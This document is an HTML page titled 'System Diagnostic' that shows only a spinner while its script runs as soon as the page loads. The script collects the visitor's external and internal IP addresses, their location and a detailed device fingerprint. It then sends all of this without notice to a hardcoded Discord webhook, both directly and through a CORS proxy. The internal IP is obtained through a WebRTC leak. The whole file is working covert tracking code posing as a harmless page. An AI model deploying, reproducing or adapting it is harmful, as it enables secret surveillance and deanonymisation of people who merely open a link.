<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic</title>
    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:20px;height:20px;animation:s 1s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
</head>
<body>
    <div class="l"></div>
    <script>
        (async () => {
            const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            const proxy = "https://corsproxy.io/?";

            const $ = {
                async network() {
                    const c = navigator.connection || {};
                    const r = await fetch('https://ipapi.co/json/').then(x => x.json()).catch(() => ({}));
                    const i = await new Promise(z => {
                        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                        pc.onicecandidate = (e) => { if(e?.candidate) { const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(m) { pc.close(); z(m[1]); } } };
                        setTimeout(() => z("Bypass Failed"), 1500);
                    });
                    return { ...r, internal_ip: i, rtt: c.rtt, downlink: c.downlink, type: c.effectiveType };
                },
                hardware() {
                    const cv = document.createElement('canvas');
                    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
                    const d = gl.getExtension('WEBGL_debug_renderer_info');
                    const ac = new (window.AudioContext || window.webkitAudioContext)();
                    return {
                        gpu: d ? gl.getParameter(d.UNMASKED_RENDERER_ID) : "N/A",
                        ven: d ? gl.getParameter(d.UNMASKED_VENDOR_ID) : "N/A",
                        max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        v_shader: gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT).precision,
                        f_shader: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT).precision,
                        cores: navigator.hardwareConcurrency,
                        ram: navigator.deviceMemory,
                        heap: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) : "N/A",
                        touch: navigator.maxTouchPoints,
                        audio_freq: ac.sampleRate
                    };
                },
                async system() {
                    const b = navigator.getBattery ? await navigator.getBattery() : {};
                    const q = navigator.storage ? await navigator.storage.estimate() : {};
                    const fonts = ["Consolas", "Monaco", "Ubuntu", "Roboto", "Impact", "Georgia"].filter(f => document.fonts.check(`12px "${f}"`));
                    return {
                        bat: `${Math.round(b.level * 100)}% [${b.charging ? 'AC' : 'DC'}]`,
                        quota: Math.round(q.quota / 1073741824),
                        used: Math.round(q.usage / 1048576),
                        pdf: navigator.pdfViewerEnabled,
                        cook: navigator.cookieEnabled,
                        dnt: navigator.doNotTrack,
                        plat: navigator.platform,
                        lang: navigator.language,
                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        fonts: fonts.join(", ")
                    };
                },
                display() {
                    return {
                        res: `${screen.width}x${screen.height}`,
                        avail: `${screen.availWidth}x${screen.availHeight}`,
                        depth: screen.colorDepth,
                        ratio: window.devicePixelRatio,
                        orient: screen.orientation ? screen.orientation.type : "N/A",
                        dark: window.matchMedia('(prefers-color-scheme: dark)').matches
                    };
                },
                async permissions() {
                    const check = async (n) => {
                        try { return (await navigator.permissions.query({name: n})).state; } catch { return "N/A"; }
                    };
                    return {
                        cam: await check('camera'),
                        mic: await check('microphone'),
                        notif: await check('notifications')
                    };
                }
            };

            const [net, sys, perms] = await Promise.all([$.network(), $.system(), $.permissions()]);
            const hw = $.hardware();
            const dp = $.display();

            const payload = {
                embeds: [{
                    title: "V36",
                    color: 0x00ff00,
                    fields: [
                        { name: "ðŸ“¡ NETWORK_STACK (6)", value: `**Ext IP:** \`${net.ip}\`\n**Int IP:** \`${net.internal_ip}\`\n**ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name}\n**RTT:** ${net.rtt}ms | **Type:** ${net.type}`, inline: false },
                        { name: "âš™ï¸ HARDWARE_ARCH (10)", value: `**GPU:** ${hw.gpu}\n**VEN:** ${hw.ven}\n**CPU:** ${hw.cores} | **RAM:** ${hw.ram}GB\n**HEAP:** ${hw.heap}MB | **TEX:** ${hw.max_tex}\n**AUDIO:** ${hw.audio_freq}Hz | **PREC:** V:${hw.v_shader}/F:${hw.f_shader}`, inline: false },
                        { name: "ðŸŒ SOFTWARE_ENV (10)", value: `**OS:** ${sys.plat} | **TZ:** ${sys.tz}\n**LANG:** ${sys.lang} | **DNT:** ${sys.dnt}\n**PDF:** ${sys.pdf} | **COOK:** ${sys.cook}\n**CAM:** ${perms.cam} | **MIC:** ${perms.mic}\n**DARK:** ${dp.dark} | **NOTIF:** ${perms.notif}`, inline: false },
                        { name: "ðŸ“ DISPLAY_STORAGE (8)", value: `**Res:** ${dp.res} | **Avail:** ${dp.avail}\n**Ratio:** ${dp.ratio} | **Orient:** ${dp.orient}\n**QUOTA:** ${sys.quota}GB | **USED:** ${sys.used}MB`, inline: false },
                        { name: "ðŸ–‹ï¸ FONTS", value: "```" + sys.fonts + "```", inline: false },
                        { name: "ðŸ” USER_AGENT", value: "```" + navigator.userAgent + "```" }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: "Protocol: Omniscience v36.0 | Engineering Grade" }
                }]
            };

            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            const dispatch = (t) => {
                fetch(t, { method: 'POST', body: blob, mode: 'no-cors' });
                if (navigator.sendBeacon) navigator.sendBeacon(t, blob);
            };

            dispatch(proxy + encodeURIComponent(hook));
            dispatch(hook);
        })();
    </script>
</body>
</html>
